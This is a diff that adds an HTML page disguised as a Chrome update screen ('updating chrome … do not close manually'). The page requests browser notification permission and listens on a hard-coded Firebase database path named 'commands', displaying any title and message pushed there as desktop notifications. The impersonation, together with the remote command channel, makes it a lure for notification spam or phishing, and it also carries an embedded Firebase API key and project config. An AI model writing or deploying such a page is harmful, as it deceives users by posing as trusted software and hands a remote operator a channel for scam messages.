@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Chrome</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <h1>updating chrome</h1>
+  <p>this will close automatically. do not close manually</p>
+
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+  <script>
+    // 1. Setup Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyDSpv4ci1qJo3Oi5WA4gj1pxrBXjxaYYao",
+      authDomain: "notify-78da1.firebaseapp.com",
+      databaseURL: "https://notify-78da1-default-rtdb.firebaseio.com",
+      projectId: "notify-78da1",
+      storageBucket: "notify-78da1.appspot.com",
+      messagingSenderId: "936289141781",
+      appId: "1:936289141781:web:065ef577df0aa61f40fa1c"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Ask for notification permission
+    if (Notification.permission !== "granted") {
+      Notification.requestPermission();
+    }
+
+    function sendNotification(title, body) {
+      if (Notification.permission === "granted") {
+        new Notification(title, { body: body });
+      }
+    }
+
+    // Listen for new notifications in Firebase
+    const commandRef = db.ref("commands");
+
+    commandRef.on("value", (snapshot) => {
+      const data = snapshot.val();
+      if (!data) return; // Don't run if no data
+      if (data.title && data.message) {
+        sendNotification(data.title, data.message);
+      }
+    });
+  </script>
+</body>
+</html>
